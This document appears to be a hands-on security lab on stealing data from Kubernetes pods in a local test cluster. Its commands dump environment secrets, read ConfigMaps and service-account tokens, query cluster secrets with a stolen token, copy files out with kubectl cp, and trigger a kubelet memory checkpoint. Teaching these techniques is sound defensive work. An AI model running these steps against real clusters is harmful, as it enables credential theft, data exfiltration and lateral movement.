# Collecting Data from a Pod

An attacker with Kubernetes API access can exfiltrate data from running pods without ever establishing an interactive shell. Built-in commands like `kubectl cp` and `kubectl exec`, combined with the Kubelet Checkpoint API, give a privileged attacker multiple paths to harvest files, environment variables, service-account tokens, and even full memory dumps from live containers.

## Description

Kubernetes administrative commands provide several vectors for data collection that operate entirely through the API server — no direct network access to the pod is required:

- **`kubectl cp`** copies files from any pod to the attacker's machine, bypassing application-level access controls entirely.
- **`kubectl exec`** runs arbitrary commands inside a running container, allowing the attacker to read environment variables (which frequently contain database passwords, API keys, and cloud credentials), inspect mounted volumes, and harvest service-account tokens.
- **Mounted volumes and ConfigMaps** are accessible to any process — or attacker — that can exec into the pod. ConfigMaps often hold connection strings and third-party API credentials.
- **Kubelet Checkpoint API** (alpha, `v1` in Kubernetes ≥ 1.25) creates a forensic-quality, OCI-compatible checkpoint archive of a running container. The archive contains all memory pages of every process in the container, including decrypted secrets, session tokens, and private keys that were never written to disk.

In all cases the attacker's only requirement is API server access with `exec`, `cp`, or direct kubelet access — privileges that are frequently granted to developers and CI/CD service accounts in real clusters.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker has `exec` and `get` permissions on pods in the target namespace.

## Quick Start

### Step 1 — Deploy the target application with sensitive data

```bash
kubectl apply -f sensitive-pod.yaml
```

Wait for the deployment to become ready:

```bash
kubectl rollout status deployment/sensitive-app -n prod-app
```

Capture the pod name for subsequent steps:

```bash
POD=$(kubectl get pod -n prod-app -l app=sensitive-app -o jsonpath='{.items[0].metadata.name}')
echo "Target pod: $POD"
```

### Step 2 — Harvest environment variables

Environment variables are the most common location for credentials in containerized applications. Dump them all in a single command:

```bash
kubectl exec -n prod-app "$POD" -- env
```

Expected output (truncated):

```
DB_USER=admin
DB_PASSWORD=P@ssw0rd!SuperSecret
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
APP_ENV=production
...
```

Filter for the most sensitive patterns:

```bash
kubectl exec -n prod-app "$POD" -- env | \
  grep -iE "(password|secret|key|token|credential|api)"
```

### Step 3 — Read the mounted ConfigMap for additional secrets

The pod has a ConfigMap mounted at `/etc/app`. Read it to find third-party API keys:

```bash
kubectl exec -n prod-app "$POD" -- cat /etc/app/config.yaml
```

Expected output:

```yaml
server:
  host: 0.0.0.0
  port: 8080
database:
  host: db.internal
  port: 5432
payments:
  stripe_key: sk_live_51ABCDEFghijklmnopqrstuvwx
  webhook_secret: whsec_abcdefghijklmnopqrstuvwxyz
```

### Step 4 — Steal the service-account token

Every pod receives an automatically mounted service-account token. This token can be used to authenticate directly to the Kubernetes API server:

```bash
kubectl exec -n prod-app "$POD" -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

Decode the token to inspect its claims (no secret needed — JWTs are base64-encoded):

```bash
TOKEN=$(kubectl exec -n prod-app "$POD" -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Decode the payload section (field 2 of the dot-separated JWT)
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

Expected output:

```json
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local"
  ],
  "iss": "https://kubernetes.default.svc.cluster.local",
  "kubernetes.io": {
    "namespace": "prod-app",
    "serviceaccount": {
      "name": "default"
    }
  },
  "sub": "system:serviceaccount:prod-app:default",
  ...
}
```

Use the token to query the Kubernetes API directly (simulating lateral movement):

```bash
APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
curl -s -k -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/prod-app/secrets"
```

### Step 5 — Exfiltrate files with kubectl cp

`kubectl cp` copies files directly from the pod filesystem to the attacker's local machine. No application access, no auth bypass needed — only API server access:

```bash
# Copy the entire data volume from the pod
kubectl cp -n prod-app "$POD":/data ./exfiltrated-data

# List what was collected
ls -la ./exfiltrated-data/
```

Expected output:

```
total 24
drwxr-xr-x  5 user  staff   160 Jan 01 00:00 .
drwxr-xr-x  3 user  staff    96 Jan 01 00:00 ..
-rw-r--r--  1 user  staff   390 Jan 01 00:00 auth_token.txt
-rw-r--r--  1 user  staff   120 Jan 01 00:00 customers.csv
-rw-r--r--  1 user  staff   100 Jan 01 00:00 id_rsa
```

Read the collected files:

```bash
cat ./exfiltrated-data/customers.csv
```

Expected output:

```
customer_id,email,credit_card
1001,alice@example.com,4111111111111111
1002,bob@example.com,5500005555555559
```

### Step 6 — Use the Kubelet Checkpoint API (memory dump)

The Kubelet Checkpoint API creates an OCI-compliant checkpoint archive of a running container. It captures all memory pages, including secrets that exist only in memory (decryption keys, session tokens, plaintext passwords).

First identify the node the pod is running on and the full container ID:

```bash
NODE=$(kubectl get pod -n prod-app "$POD" -o jsonpath='{.spec.nodeName}')
echo "Pod is on node: $NODE"
```

For a Kind cluster, the `apiserver-kubelet-client` certificates are on the control-plane node. Exec into the control-plane and target the worker node's IP:

```bash
# Get the worker node's IP address
NODE_IP=$(docker inspect "$NODE" --format '{{.NetworkSettings.Networks.kind.IPAddress}}')

# The Kubelet API endpoint for checkpointing requires a POST request
# Format: POST /checkpoint/{namespace}/{pod}/{container}
docker exec kind-control-plane \
  curl -sk -X POST \
    --cacert /etc/kubernetes/pki/ca.crt \
    --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt \
    --key /etc/kubernetes/pki/apiserver-kubelet-client.key \
    "https://${NODE_IP}:10250/checkpoint/prod-app/${POD}/app"
```

Expected output (when CRIU is enabled on the node):

```json
{"items":["/var/lib/kubelet/checkpoints/checkpoint-<pod>_prod-app-app-<timestamp>.tar"]}
```

> **Note:** The Kubelet Checkpoint API requires CRIU (Checkpoint/Restore In Userspace) to be installed on the node. Standard Kind clusters do not include CRIU, so this step returns `method CheckpointContainer not implemented`. In a production cluster with CRIU enabled, the resulting `.tar` file contains a full memory snapshot of the container. This archive can be exfiltrated and analyzed with tools like `crit` (CRIU restore) or `strings` to extract plaintext secrets from memory.

## Cleanup

```bash
kubectl delete -f sensitive-pod.yaml
rm -rf ./exfiltrated-data
```

## Resources

- [kubectl cp](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#cp)
- [kubectl exec](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#exec)
- [Kubelet Checkpoint API](https://kubernetes.io/docs/reference/node/kubelet-checkpoint-api/)
- [CRIU — Checkpoint/Restore In Userspace](https://criu.org/)
- [MITRE ATT&CK for Containers — Data from Local System](https://attack.mitre.org/techniques/T1005/)
- [MITRE ATT&CK for Containers — Unsecured Credentials](https://attack.mitre.org/techniques/T1552/)
